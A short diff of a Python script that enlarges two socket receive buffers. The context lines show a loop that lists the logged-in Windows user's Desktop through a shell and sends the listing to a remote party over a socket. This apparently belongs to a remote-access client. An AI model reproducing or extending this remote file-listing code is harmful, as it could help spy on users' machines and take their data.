@@ -78,7 +78,7 @@ while (True):
         dir =  "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
         result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
-        msg = s.recv(1024)
+        msg = s.recv(2048)
         decodedMsg = msg.decode("utf-8")
         #returns back
         if decodedMsg == "cancel":
@@ -103,7 +103,7 @@ while (True):
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
         result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
-        msg = s.recv(1024)
+        msg = s.recv(2048)
         decodedMsg = msg.decode("utf-8")
         if decodedMsg == "cancel":
             s.sendall(bytes("cancelled", "utf-8"))
